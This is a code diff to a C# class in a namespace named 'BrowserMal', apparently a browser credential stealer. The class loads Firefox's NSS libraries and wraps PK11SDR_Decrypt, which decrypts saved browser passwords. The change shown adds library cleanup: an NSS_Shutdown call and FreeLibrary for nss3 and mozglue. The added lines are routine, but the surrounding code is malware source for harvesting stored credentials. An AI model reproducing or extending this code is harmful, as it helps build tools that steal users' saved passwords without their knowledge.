@@ -12,6 +12,7 @@ namespace BrowserMal.Encryption
     {
         private IntPtr Nss3Lib;
         private IntPtr Mozglue;
+        private static NssShutdown fpNssShutdown;
         private readonly List<string> PROGRAM_FOLDERS = new List<string>()
         {
             Environment.ExpandEnvironmentVariables("%ProgramW6432%"),
@@ -26,6 +27,10 @@ namespace BrowserMal.Encryption
             public int SECItemLen;
         }
 
+        [DllImport("kernel32.dll", SetLastError = true)]
+        [return: MarshalAs(UnmanagedType.Bool)]
+        internal static extern bool FreeLibrary(IntPtr hModule);
+
         [DllImport("kernel32.dll")]
         public static extern IntPtr LoadLibrary(string dllFilePath);
         
@@ -37,6 +42,9 @@ namespace BrowserMal.Encryption
 
         [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
         public delegate long DLLFunctionDelegate(string path);
+
+        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
+        public delegate long NssShutdown();
 
         private string FindMozzilaFolder(string name)
         {
@@ -126,6 +134,17 @@ namespace BrowserMal.Encryption
             }
 
             return string.Empty;
+        }
+
+        public void Free()
+        {
+            IntPtr ipNssShutdown = GetProcAddress(Nss3Lib, "NSS_Shutdown");
+            fpNssShutdown = (NssShutdown)Marshal.GetDelegateForFunctionPointer(ipNssShutdown, typeof(NssShutdown));
+
+            fpNssShutdown();
+
+            FreeLibrary(Nss3Lib);
+            FreeLibrary(Mozglue);
         }
 
         public int PK11SDR_Decrypt(ref TSECItem data, ref TSECItem result, int cx)
